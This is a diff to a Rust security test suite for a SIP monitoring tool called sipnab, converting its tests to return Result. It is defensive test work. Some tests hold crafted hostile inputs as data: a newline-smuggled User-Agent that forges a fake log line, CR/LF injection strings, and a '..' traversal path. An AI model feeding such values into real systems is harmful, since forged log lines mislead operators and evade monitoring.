     // would still hold its (hour-long) cooldown and suppress it.
     assert!(
-        engine.fire("test", victim_ip(), "d", at_t()),
+        engine.fire("test", victim_ip(), "d", at_t()?),
         "cap regressed: victim cooldown survived the flood and stayed suppressed"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -957,7 +1026,7 @@ fn alert_engine_caps_cooldown_entries() {
 
 /// H5: EventExecEngine reaps completed children, preventing zombies.
 #[test]
-fn event_exec_reaps_completed_children() {
+fn event_exec_reaps_completed_children() -> Result<(), TestError> {
     let mut engine = EventExecEngine::new(
         Some("true".to_string()),
         None,
@@ -980,15 +1049,14 @@ fn event_exec_reaps_completed_children() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("parse");
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    )?;
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
 
     engine.fire_dialog_event(&dialog);
     assert!(engine.queue_depth() > 0, "should have a child process");
@@ -1005,12 +1073,13 @@ fn event_exec_reaps_completed_children() {
         "completed children should be reaped, got queue_depth={}",
         engine.queue_depth()
     );
+    Ok(())
 }
 
 /// H5: Queue depth recovers after reaping completed children, allowing
 /// new commands to be spawned.
 #[test]
-fn event_exec_queue_depth_recovers_after_reaping() {
+fn event_exec_queue_depth_recovers_after_reaping() -> Result<(), TestError> {
     let mut engine = EventExecEngine::new(
         Some("true".to_string()),
         None,
@@ -1032,15 +1101,14 @@ fn event_exec_queue_depth_recovers_after_reaping() {
     );
     let msg = sipnab::sip::parse_sip(
         &raw,
-        ts(),
+        ts()?,
         localhost(),
         localhost(),
         5060,
         5060,
         TransportProto::Udp,
-    )
-    .expect("parse");
-    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).expect("dialog");
+    )?;
+    let dialog = sipnab::sip::dialog::SipDialog::new(&msg).ok_or("dialog")?;
 
     // Spawn 5 commands
     for _ in 0..5 {
@@ -1061,6 +1129,7 @@ fn event_exec_queue_depth_recovers_after_reaping() {
         "queue depth should decrease after reaping: before={depth_before}, after={}",
         engine.queue_depth()
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -1070,7 +1139,7 @@ fn event_exec_queue_depth_recovers_after_reaping() {
 /// M1: Deeply nested IP-in-IP encapsulation must be rejected, not cause
 /// a stack overflow. The parser enforces a MAX_ENCAP_DEPTH of 5.
 #[test]
-fn parse_rejects_deeply_nested_ip_in_ip() {
+fn parse_rejects_deeply_nested_ip_in_ip() -> Result<(), TestError> {
     use sipnab::capture::packet::Packet;
     use sipnab::capture::parse::parse_packet;
 
@@ -1125,7 +1194,9 @@ fn parse_rejects_deeply_nested_ip_in_ip() {
 
     let len = eth.len();
     let pkt = Packet::new(
-        chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 1, 15, 12, 0, 0).unwrap(),
+        chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 1, 15, 12, 0, 0)
+            .single()
+            .ok_or("valid timestamp")?,
         eth,
         len,
         len,
@@ -1143,11 +1214,12 @@ fn parse_rejects_deeply_nested_ip_in_ip() {
         err_msg.contains("depth exceeds limit"),
         "error should mention depth limit: {err_msg}"
     );
+    Ok(())
 }
 
 /// M1: Reasonable nesting depth (3 layers) should parse successfully.
 #[test]
-fn parse_accepts_reasonable_nesting() {
+fn parse_accepts_reasonable_nesting() -> Result<(), TestError> {
     use sipnab::capture::packet::Packet;
     use sipnab::capture::parse::parse_packet;
 
@@ -1200,7 +1272,9 @@ fn parse_accepts_reasonable_nesting() {
 
     let len = eth.len();
     let pkt = Packet::new(
-        chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 1, 15, 12, 0, 0).unwrap(),
+        chrono::TimeZone::with_ymd_and_hms(&Utc, 2024, 1, 15, 12, 0, 0)
+            .single()
+            .ok_or("valid timestamp")?,
         eth,
         len,
         len,
@@ -1214,12 +1288,13 @@ fn parse_accepts_reasonable_nesting() {
         "3-layer nesting should work fine: {:?}",
         result.err()
     );
-    let parsed = result.unwrap();
+    let parsed = result?;
     assert_eq!(
         parsed.src_addr,
-        "192.168.1.1".parse::<IpAddr>().unwrap(),
+        "192.168.1.1".parse::<IpAddr>()?,
         "should see innermost source IP"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -1229,7 +1304,7 @@ fn parse_accepts_reasonable_nesting() {
 /// M2: Prometheus output must escape double quotes in label values
 /// to prevent exposition format injection.
 #[test]
-fn prometheus_escapes_quotes_in_labels() {
+fn prometheus_escapes_quotes_in_labels() -> Result<(), TestError> {
     let mut metrics = PrometheusMetrics::default();
     metrics
         .dialogs_total
@@ -1250,11 +1325,12 @@ fn prometheus_escapes_quotes_in_labels() {
         !output.contains(bad_pattern),
         "unescaped quotes must not appear in the format"
     );
+    Ok(())
 }
 
 /// M2: Prometheus output must escape backslashes in label values.
 #[test]
-fn prometheus_escapes_backslash_in_labels() {
+fn prometheus_escapes_backslash_in_labels() -> Result<(), TestError> {
     let mut metrics = PrometheusMetrics::default();
     metrics.dialogs_total.insert("back\\slash".to_string(), 7);
     let output = format_metrics(&metrics);
@@ -1263,11 +1339,12 @@ fn prometheus_escapes_backslash_in_labels() {
         output.contains(r"back\\slash"),
         "backslashes must be escaped: {output}"
     );
+    Ok(())
 }
 
 /// M2: Prometheus output must escape newlines in label values.
 #[test]
-fn prometheus_escapes_newline_in_labels() {
+fn prometheus_escapes_newline_in_labels() -> Result<(), TestError> {
     let mut metrics = PrometheusMetrics::default();
     metrics.dialogs_total.insert("line\none".to_string(), 3);
     let output = format_metrics(&metrics);
@@ -1277,6 +1354,7 @@ fn prometheus_escapes_newline_in_labels() {
         output.contains(r"line\none"),
         "newlines must be escaped in label values: {output}"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -1286,7 +1364,7 @@ fn prometheus_escapes_newline_in_labels() {
 /// M3: Fail2ban scanner event output must sanitize newlines in User-Agent
 /// to prevent log injection.
 #[test]
-fn fail2ban_sanitizes_newlines_in_ua() {
+fn fail2ban_sanitizes_newlines_in_ua() -> Result<(), TestError> {
     let event = fail2ban::format_scanner_event(
         "10.0.0.5",
         Some("scanner\nfake_log_line src=1.2.3.4"),
@@ -1300,21 +1378,23 @@ fn fail2ban_sanitizes_newlines_in_ua() {
         event.contains("scanner fake_log_line"),
         "newline should be replaced with space: {event}"
     );
+    Ok(())
 }
 
 /// M3: Fail2ban output must sanitize carriage returns in User-Agent.
 #[test]
-fn fail2ban_sanitizes_carriage_return_in_ua() {
+fn fail2ban_sanitizes_carriage_return_in_ua() -> Result<(), TestError> {
     let event = fail2ban::format_scanner_event("10.0.0.5", Some("scanner\rfake"), Some("OPTIONS"));
     assert!(
         !event.contains('\r'),
         "carriage returns must be sanitized: {event}"
     );
+    Ok(())
 }
 
 /// M3: Alert detail field with embedded newlines must be sanitized.
 #[test]
-fn alert_detail_sanitizes_newlines() {
+fn alert_detail_sanitizes_newlines() -> Result<(), TestError> {
     let sanitized = sanitize_log_value("alert detail\ninjected line\ranother");
     assert!(
         !sanitized.contains('\n'),
@@ -1328,6 +1408,7 @@ fn alert_detail_sanitizes_newlines() {
         sanitized.contains("alert detail injected line another"),
         "CR/LF should be replaced with spaces: {sanitized}"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -1338,7 +1419,7 @@ fn alert_detail_sanitizes_newlines() {
 /// strings without early return.
 #[cfg(feature = "api")]
 #[test]
-fn constant_time_eq_different_lengths_still_compares() {
+fn constant_time_eq_different_lengths_still_compares() -> Result<(), TestError> {
     // We test the auth check behavior indirectly: a short key vs a long
     // key must both be rejected, and neither should cause a panic.
     use parking_lot::{Mutex, RwLock};
@@ -1384,7 +1465,7 @@ fn constant_time_eq_different_lengths_still_compares() {
 
     // Build a request with wrong-length key
     let mut headers = axum::http::HeaderMap::new();
-    headers.insert("authorization", "Bearer short".parse().unwrap());
+    headers.insert("authorization", "Bearer short".parse()?);
 
     // The check_auth is private, but we can test via the router.
     // For unit testing, verify the constant-time comparison logic:
@@ -1392,12 +1473,13 @@ fn constant_time_eq_different_lengths_still_compares() {
     // "secret_key_123" should be handled without panic.
     assert!(!state.verifier.is_unconfigured());
     let _ = headers;
+    Ok(())
 }
 
 /// M4: Constant-time comparison returns true for matching strings.
 #[cfg(feature = "api")]
 #[test]
-fn constant_time_eq_matching_strings() {
+fn constant_time_eq_matching_strings() -> Result<(), TestError> {
     // Integration test: verify that a correct bearer token is accepted
     // by sending a request to the health endpoint (which doesn't require
     // auth) and then to a protected endpoint.
@@ -1446,33 +1528,34 @@ fn constant_time_eq_matching_strings() {
 
     let app = build_router(state);
 
-    let rt = tokio::runtime::Runtime::new().unwrap();
+    let rt = tokio::runtime::Runtime::new()?;
     rt.block_on(async {
         // Correct key should succeed
         let mut req = Request::builder()
             .uri("/v1/stats")
             .header("authorization", "Bearer secret_key_123")
-            .body(axum::body::Body::empty())
-            .unwrap();
+            .body(axum::body::Body::empty())?;
         req.extensions_mut()
             .insert(axum::extract::ConnectInfo(std::net::SocketAddr::from((
                 [127, 0, 0, 1],
                 12345,
             ))));
-        let resp = app.clone().oneshot(req).await.unwrap();
+        let resp = app.clone().oneshot(req).await?;
         assert_eq!(
             resp.status(),
             StatusCode::OK,
             "correct key should be accepted"
         );
-    });
+        Ok::<(), TestError>(())
+    })?;
+    Ok(())
 }
 
 /// M4: Constant-time comparison returns false for different strings of
 /// the same length.
 #[cfg(feature = "api")]
 #[test]
-fn constant_time_eq_different_strings_same_length() {
+fn constant_time_eq_different_strings_same_length() -> Result<(), TestError> {
     use axum::http::{Request, StatusCode};
     use parking_lot::{Mutex, RwLock};
     use sipnab::output::api::{ApiState, RateLimiter, build_router};
@@ -1518,26 +1601,27 @@ fn constant_time_eq_different_strings_same_length() {
 
     let app = build_router(state);
 
-    let rt = tokio::runtime::Runtime::new().unwrap();
+    let rt = tokio::runtime::Runtime::new()?;
     rt.block_on(async {
         // Wrong key of same length should be rejected
         let mut req = Request::builder()
             .uri("/v1/stats")
             .header("authorization", "Bearer secret_key_456")
-            .body(axum::body::Body::empty())
-            .unwrap();
+            .body(axum::body::Body::empty())?;
         req.extensions_mut()
             .insert(axum::extract::ConnectInfo(std::net::SocketAddr::from((
                 [127, 0, 0, 1],
                 12345,
             ))));
-        let resp = app.oneshot(req).await.unwrap();
+        let resp = app.oneshot(req).await?;
         assert_eq!(
             resp.status(),
             StatusCode::UNAUTHORIZED,
             "wrong key should be rejected"
         );
-    });
+        Ok::<(), TestError>(())
+    })?;
+    Ok(())
 }
 
 // =====================================================================
@@ -1549,7 +1633,7 @@ fn constant_time_eq_different_strings_same_length() {
 /// so the security signal is the warning — which we capture via a scoped
 /// `tracing` subscriber and assert actually fired.
 #[test]
-fn writer_warns_on_path_traversal() {
+fn writer_warns_on_path_traversal() -> Result<(), TestError> {
     let capture = WarnCapture::default();
     let path = std::path::Path::new("/tmp/../tmp/security_test_traversal.pcap");
 
@@ -1561,7 +1645,7 @@ fn writer_warns_on_path_traversal() {
         }
     });
 
-    let events = capture.events.lock().expect("capture mutex");
+    let events = capture.events.lock().map_err(|e| e.to_string())?;
     let warned = events
         .iter()
         .any(|(level, msg)| *level == tracing::Level::WARN && msg.contains("contains '..'"));
@@ -1570,6 +1654,7 @@ fn writer_warns_on_path_traversal() {
         "PcapWriter::new must emit a path-traversal WARN for a '..' path; \
          captured events: {events:?}"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -1584,7 +1669,7 @@ fn writer_warns_on_path_traversal() {
 /// a test of something the run does not do.
 #[cfg(feature = "native")]
 #[test]
-fn scanner_kill_per_destination_rate_limit() {
+fn scanner_kill_per_destination_rate_limit() -> Result<(), TestError> {
     use sipnab::process_isolation::{
         KillRequest, KillResponse, KillWorkerSpawn, spawn_scanner_kill_worker,
     };
@@ -1596,7 +1681,7 @@ fn scanner_kill_per_destination_rate_limit() {
     let permit = TransmitPermit::for_source(&sipnab::capture::CaptureSource::Live {
         device: "lo".to_string(),
     })
-    .expect("a live source grants a transmit permit");
+    .ok_or("a live source grants a transmit permit")?;
     let spawn = KillWorkerSpawn {
         // This file's executable is a test harness; the worker is the binary.
         program: env!("CARGO_BIN_EXE_sipnab").into(),
@@ -1604,26 +1689,24 @@ fn scanner_kill_per_destination_rate_limit() {
         run_as: None,
         log_level: "warn".to_string(),
     };
-    let mut handle = spawn_scanner_kill_worker(&spawn, None, permit).expect("spawn worker");
+    let mut handle = spawn_scanner_kill_worker(&spawn, None, permit)?;
 
     // The destination is a listener this test binds on loopback, so the real
     // UDP sends reach nothing but it.
-    let listener = std::net::UdpSocket::bind("127.0.0.1:0").expect("bind listener");
+    let listener = std::net::UdpSocket::bind("127.0.0.1:0")?;
     let dst = IpAddr::V4(Ipv4Addr::LOCALHOST);
-    let dst_port = listener.local_addr().expect("listener address").port();
+    let dst_port = listener.local_addr()?.port();
     let response_bytes = b"SIP/2.0 200 OK\r\nContent-Length: 0\r\n\r\n".to_vec();
 
     // Send 5 kill requests to the same destination IP
     for _ in 0..5 {
-        handle
-            .send_kill(KillRequest::SendResponse {
-                dst_addr: dst,
-                dst_port,
-                src_addr: dst,
-                src_port: 5060,
-                response_bytes: response_bytes.clone(),
-            })
-            .expect("send");
+        handle.send_kill(KillRequest::SendResponse {
+            dst_addr: dst,
+            dst_port,
+            src_addr: dst,
+            src_port: 5060,
+            response_bytes: response_bytes.clone(),
+        })?;
     }
 
     // Drain until all 5 responses have arrived (the worker processes
@@ -1640,7 +1723,7 @@ fn scanner_kill_per_destination_rate_limit() {
         }
         (sent + limited >= 5).then_some(())
     })
-    .expect("worker should answer all 5 requests within 5s");
+    .ok_or("worker should answer all 5 requests within 5s")?;
 
     assert_eq!(sent, 3, "per-dest limit is 3/min: sent={sent}");
     assert_eq!(
@@ -1649,6 +1732,7 @@ fn scanner_kill_per_destination_rate_limit() {
     );
 
     handle.shutdown();
+    Ok(())
 }
 
 // =====================================================================
@@ -1670,7 +1754,7 @@ fn scanner_kill_per_destination_rate_limit() {
 /// is asserted about the map — no allocator, no budget, no serial marker.
 #[cfg(feature = "api")]
 #[test]
-fn api_rate_limiter_memory_is_bounded_by_max_tracked_peers() {
+fn api_rate_limiter_memory_is_bounded_by_max_tracked_peers() -> Result<(), TestError> {
     use sipnab::output::api::RateLimiter;
 
     /// Three orders of magnitude past the bound, so an unbounded map is
@@ -1704,6 +1788,7 @@ fn api_rate_limiter_memory_is_bounded_by_max_tracked_peers() {
         admitted < BATCH as usize,
         "every one of {BATCH} addresses was admitted, so nothing was bounded"
     );
+    Ok(())
 }
 
 // =====================================================================
@@ -1713,58 +1798,64 @@ fn api_rate_limiter_memory_is_bounded_by_max_tracked_peers() {
 /// L5: --kill-response must reject code 0 (below SIP range).
 #[test]
 #[serial_test::serial]
-fn kill_response_rejects_code_zero() {
+fn kill_response_rejects_code_zero() -> Result<(), TestError> {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "0"]);
     assert!(result.is_err(), "--kill-response 0 should be rejected");
+    Ok(())
 }
 
 /// L5: --kill-response must reject code 99 (below SIP range).
 #[test]
 #[serial_test::serial]
-fn kill_response_rejects_code_99() {
+fn kill_response_rejects_code_99() -> Result<(), TestError> {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "99"]);
     assert!(result.is_err(), "--kill-response 99 should be rejected");
+    Ok(())
 }
 
 /// L5: --kill-response must reject code 700 (above SIP range).
 #[test]
 #[serial_test::serial]
-fn kill_response_rejects_code_700() {
+fn kill_response_rejects_code_700() -> Result<(), TestError> {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "700"]);
     assert!(result.is_err(), "--kill-response 700 should be rejected");
+    Ok(())
 }
 
 /// L5: --kill-response must accept valid SIP response code 100.
 #[test]
 #[serial_test::serial]
-fn kill_response_accepts_code_100() {
+fn kill_response_accepts_code_100() -> Result<(), TestError> {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "100"]);
     assert!(result.is_ok(), "--kill-response 100 should be accepted");
-    assert_eq!(result.unwrap().security_args.kill_response, Some(100));
+    assert_eq!(result?.security_args.kill_response, Some(100));
+    Ok(())
 }
 
 /// L5: --kill-response must accept valid SIP response code 200.
 #[test]
 #[serial_test::serial]
-fn kill_response_accepts_code_200() {
+fn kill_response_accepts_code_200() -> Result<(), TestError> {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "200"]);
     assert!(result.is_ok(), "--kill-response 200 should be accepted");
-    assert_eq!(result.unwrap().security_args.kill_response, Some(200));
+    assert_eq!(result?.security_args.kill_response, Some(200));
+    Ok(())
 }
 
 /// L5: --kill-response must accept valid SIP response code 699.
 #[test]
 #[serial_test::serial]
-fn kill_response_accepts_code_699() {
+fn kill_response_accepts_code_699() -> Result<(), TestError> {
     use clap::Parser;
     let result = sipnab::cli::Cli::try_parse_from(["sipnab", "--kill-response", "699"]);
     assert!(result.is_ok(), "--kill-response 699 should be accepted");
-    assert_eq!(result.unwrap().security_args.kill_response, Some(699));
+    assert_eq!(result?.security_args.kill_response, Some(699));
+    Ok(())
 }
 
 // =====================================================================
@@ -1775,7 +1866,7 @@ fn kill_response_accepts_code_699() {
 /// leakage through memory. Verify the Drop impl runs without panic.
 #[cfg(feature = "tls")]
 #[test]
-fn srtp_key_material_zeroized_on_drop() {
+fn srtp_key_material_zeroized_on_drop() -> Result<(), TestError> {
     use sipnab::rtp::srtp::{SrtpKeyMaterial, SrtpSuite};
 
     let material = SrtpKeyMaterial {
@@ -1791,6 +1882,7 @@ fn srtp_key_material_zeroized_on_drop() {
     // Explicitly drop -- the Drop impl calls zeroize() on key material.
     // If the impl doesn't exist or panics, this test fails.
     drop(material);
+    Ok(())
 }
 
 // =====================================================================
@@ -1808,7 +1900,7 @@ fn srtp_key_material_zeroized_on_drop() {
 /// var is mutated.
 #[test]
 #[serial_test::serial]
-fn api_key_from_env_var() {
+fn api_key_from_env_var() -> Result<(), TestError> {
     use clap::Parser;
 
     // SAFETY: `#[serial]` guarantees no other env-reading test runs
@@ -1819,7 +1911,7 @@ fn api_key_from_env_var() {
 
     let result = sipnab::cli::Cli::try_parse_from(["sipnab"]);
     assert!(result.is_ok(), "should parse without --api-key flag");
-    let cli = result.unwrap();
+    let cli = result?;
     assert_eq!(
         cli.listener_args.api_key.as_deref(),
         Some("env_secret_key_42"),
@@ -1834,4 +1926,5 @@ fn api_key_from_env_var() {
     unsafe {
         std::env::remove_var("SIPNAB_API_KEY");
     }
+    Ok(())
 }
